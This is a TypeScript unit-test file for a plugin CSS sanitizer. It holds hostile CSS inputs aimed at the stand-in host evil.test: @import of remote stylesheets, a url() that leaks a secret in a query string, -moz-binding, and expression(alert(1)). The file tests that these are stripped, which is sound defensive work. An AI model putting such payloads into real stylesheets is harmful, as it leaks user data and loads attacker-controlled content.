// Unit tests for the plugin CSS sanitizer — the one channel a networkless plugin
// (or a fully user-controlled "trusted" custom-CSS plugin) could still abuse via
// the host applying its CSS.
//   npm run test:unit
//   node --experimental-strip-types --test test/sanitizePluginCss.test.ts

import { test } from "node:test";
import assert from "node:assert/strict";

import { sanitizePluginCss } from "../src/plugins/sandbox.ts";

test("strips @import at-rules (url and string form)", () => {
  assert.ok(!/@import/i.test(sanitizePluginCss('@import url("https://evil.test/x.css");')));
  assert.ok(!/@import/i.test(sanitizePluginCss("@import 'https://evil.test/x.css';")));
  assert.ok(!/@import/i.test(sanitizePluginCss("@import url(//evil.test/x.css)")));
});

test("neutralizes every url() regardless of scheme", () => {
  const cases = [
    "a { background: url(https://evil.test/p.png?leak=secret); }",
    "a { background: url('http://evil.test/p.png'); }",
    'a { background: url("//evil.test/p.png"); }',
    "a { background: url(data:image/svg+xml;base64,AAAA); }",
    "a { background: url(blob:abc); }",
    "a { background: url(/same-origin/track.png); }",
    "a { background: url(relative.png); }",
  ];
  for (const input of cases) {
    const out = sanitizePluginCss(input);
    assert.ok(!/url\s*\(/i.test(out), `url() survived sanitization: ${input} -> ${out}`);
    assert.ok(!/evil\.test/.test(out) || !/url/i.test(out));
  }
});

test("neutralizes a bare/unterminated url(", () => {
  const out = sanitizePluginCss("a { background: url( ");
  assert.ok(!/url\s*\(/i.test(out), out);
});

test("neutralizes IE expression() and -moz-binding", () => {
  assert.ok(!/expression\s*\(/i.test(sanitizePluginCss("a { width: expression(alert(1)); }")));
  assert.ok(!/-moz-binding\b/i.test(sanitizePluginCss("a { -moz-binding: url(evil.xml#x); }")));
});

test("leaves benign CSS intact", () => {
  const css = ".x { color: #fff; font-size: 13px; border-left: 3px solid #000; }";
  assert.equal(sanitizePluginCss(css), css);
});

test("handles non-string input safely", () => {
  // @ts-expect-error exercising the runtime guard
  assert.equal(sanitizePluginCss(undefined), "");
  // @ts-expect-error exercising the runtime guard
  assert.equal(sanitizePluginCss(null), "");
});
